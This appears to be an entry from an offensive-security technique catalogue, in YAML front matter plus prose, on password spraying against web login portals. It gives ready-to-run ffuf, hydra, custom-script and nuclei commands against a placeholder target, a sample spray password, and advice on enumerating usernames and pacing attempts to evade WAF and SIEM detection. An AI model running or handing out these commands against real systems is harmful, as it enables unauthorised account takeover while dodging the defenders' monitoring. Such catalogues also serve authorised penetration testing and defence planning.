---
id: init-006
title: "Password Spray on Web Login"
category: initial_access
tags: [password-spray, web-login, burp-intruder, ffuf, credential-stuffing]
platform: [linux, windows]
commands:
  - "ffuf -w users.txt:USER -w passwords.txt:PASS -u https://target.example.com/login -X POST -d 'username=USER&password=PASS' -fc 302 -fs 1234"
  - "hydra -L users.txt -P passwords.txt https-post-form://target.example.com/login:'username=^USER^&password=^PASS^:Invalid credentials'"
  - "python3 spray.py -t https://target.example.com/login -u users.txt -p 'Summer2024!' --delay 60"
  - "nuclei -t http/fuzzing/credentials-stuffing.yaml -u https://target.example.com"
references:
  - "https://attack.mitre.org/techniques/T1110/003/"
  - "https://github.com/ffuf/ffuf"
---

Password spraying against web login portals tests commonly used passwords against enumerated or guessed usernames without triggering per-account lockout policies, targeting authentication interfaces such as OWA, VPN portals, CRM systems, and admin panels. Tools like Burp Suite Intruder (cluster bomb attack) and `ffuf` allow precise control over request timing and payload delivery, with filtering by HTTP status code or response size to identify successful authentications. Effective spraying requires prior username enumeration (via OSINT, email format guessing, or verbose error messages), careful rate limiting to avoid detection by WAFs and SIEM rules, and identification of applications that do not implement account lockout at all.
